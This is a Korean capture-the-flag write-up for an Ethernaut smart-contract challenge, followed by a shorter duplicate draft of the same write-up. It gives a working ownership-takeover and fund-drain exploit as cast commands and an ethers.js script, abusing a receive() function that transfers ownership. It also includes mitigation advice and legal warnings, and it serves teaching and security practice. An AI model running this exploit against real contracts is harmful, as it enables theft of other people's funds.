# Ethernaut — "Owner & Drain" (공격 가이드)

목표
- 컨트랙트의 소유자(owner)가 된다.
- 컨트랙트 잔액을 전부 인출하여 잔액을 0으로 만든다.

주의
- 이 문서는 교육/CTF 용도로만 작성되었습니다. 메인넷에서 타인 소유 컨트랙트에 대해 무단으로 공격을 수행하면 불법입니다.
- 실습은 로컬 체인(Anvil / forge fork) 또는 퍼블릭 테스트넷에서만 하세요.
- 개인 키를 리포지토리에 절대 저장하지 마세요. 민감한 값은 환경변수(.env)로 관리하세요.

핵심 취약점 요약
- 컨트랙트는 두 경로로 소유권을 바꿀 수 있습니다:
  1) `contribute()` — `contributions[msg.sender]`가 `contributions[owner]`보다 커지면 `owner`로 변경
  2) `receive()` — `msg.value > 0 && contributions[msg.sender] > 0`이면 `owner = msg.sender`
- 생성자에서 배포자(owner)의 `contributions`가 `1000 ether`로 초기화되므로, `contribute()` 경로로는 owner의 `contributions`를 능가하기 어렵습니다. 대신 `receive()` 경로를 이용합니다.

왜 이것이 가능한가?
- `receive()`는 ABI 호출이 아닌 단순한 전송(plain ether transfer)으로도 실행됩니다. `receive()`는 송신자(`msg.sender`)의 `contributions`가 0보다 크기만 하면 `owner`를 넘겨주므로,
  1) 먼저 `contribute()`로 본인의 `contributions`를 0보다 크게 만든 뒤
  2) 같은 계정으로 컨트랙트에 단순 ether 전송을 하면 `receive()`가 실행되어 `owner`가 됩니다.

공격 단계 (요약)
1. 공격자 계정으로 `contribute()`를 호출해 `contributions[attacker] > 0`을 만든다. (전송값은 0.001 ETH 미만)
2. 동일한 공격자 계정으로 컨트랙트에 일반 전송(transfer/send)하여 `receive()`를 트리거한다. 이때 `owner`가 공격자로 바뀐다.
3. `withdraw()`를 호출해 컨트랙트 잔액을 전부 인출한다.

예시 명령어 (Foundry / cast)
- contribute 호출 (값은 반드시 0.001 ETH 미만)
```
cast send <CONTRACT_ADDRESS> --rpc-url <RPC_URL> --private-key $PRIVATE_KEY "contribute()" --value 0.0009ether
```
- 단순 전송(plain transfer)으로 `receive()` 트리거
```
cast send <CONTRACT_ADDRESS> --rpc-url <RPC_URL> --private-key $PRIVATE_KEY --value 0.001ether
```
Note: 위 `--value`는 예시입니다. 실제로는 `receive()`가 실행되도록 0보다 큰 값이면 됩니다.

예시 (ethers.js 콘솔 / Hardhat console)
```javascript
// 1) 컨트랙트 인스턴스 생성
// const contract = await ethers.getContractAt("BetHouse", "<CONTRACT_ADDRESS>");

// 2) contribute 호출 (0.0009 ETH)
await contract.connect(attacker).contribute({ value: ethers.utils.parseEther("0.0009") });

// 3) 동일한 계정으로 단순 전송 (receive 트리거)
await attacker.sendTransaction({ to: contract.address, value: ethers.utils.parseEther("0.001") });

// 4) 소유권 확인
const newOwner = await contract.owner();
console.log("new owner:", newOwner);

// 5) withdraw로 잔액 전부 인출
await contract.connect(attacker).withdraw();
```

로컬에서 안전하게 재현하기
- Anvil 사용 (권장): anvil을 켜고, `forge test` 또는 `forge script`로 재현
- 포크 환경 예시:
```
forge test --fork-url <RPC_URL> -vvvv
```

보안/완화 권장사항
- receive()에서 `contributions[msg.sender] > 0`만으로 소유권을 이전하는 것은 위험합니다. 소유권 이전 조건을 더 엄격히 하거나, 소유권 이전을 위한 별도 안전 검증(예: 서명, 관리자 승인)을 추가해야 합니다.
- 컨트랙트 설계 시 `msg.value`/`contributions` 같은 상태 변경과 소유권 변경 로직을 분리하고, 외부에서 단순 전송으로 중요한 상태가 바뀌지 않도록 주의하세요.

참고: 핵심 코드 발췌
```solidity
constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
}

function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}

receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}

function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```

문제가 발생하면
- 로컬 포크를 띄워 재현 로그(트랜잭션 해시, 이벤트)를 확인하세요.
- 트랜잭션이 revert되면 revert 메시지와 스택을 확인하고, 필요한 경우 작은 단위(value)로 재시도하세요.

저작권 및 법적 고지
- 이 문서는 학습/CTF 목적이며, 실제 시스템에 대한 무단 공격은 법적 책임을 초래할 수 있습니다.
# Solve — Ethernaut Challenge (owner & drain)

> 목적  
> 1) 컨트랙트의 owner가 된다.  
> 2) 컨트랙트의 잔액을 0으로 만든다.

---

## 요약 (한줄)
컨트랙트의 `contributions` 조건을 이용해 `receive()` 경로로 owner를 탈취한 뒤 `withdraw()`로 잔액을 모두 인출한다.

---

## 전제 / 주의사항
- 이 문서는 **교육용 / CTF용**으로 작성되었습니다. 실제 메인넷/타인 소유 계약에 대해 무단으로 공격을 수행하면 불법입니다.  
- 가능한 **로컬 체인(forge fork)** 또는 퍼블릭 테스트넷(예: Sepolia)에서만 실습하세요. 메인넷에서는 절대 실행하지 마세요.  
- 절대 개인 키를 리포지토리에 커밋하지 마세요. 환경변수(.env)로 관리하세요.

---

## 컨트랙트 핵심 코드(핵심부 발췌)
```solidity
constructor() public {
	owner = msg.sender;
	contributions[msg.sender] = 1000 * (1 ether);
}

function contribute() public payable {
	require(msg.value < 0.001 ether);
	contributions[msg.sender] += msg.value;
	if(contributions[msg.sender] > contributions[owner]) {
		owner = msg.sender;
	}
}

receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	owner = msg.sender;
}

function withdraw() public onlyOwner {
	payable(owner).transfer(address(this).balance);
}
```


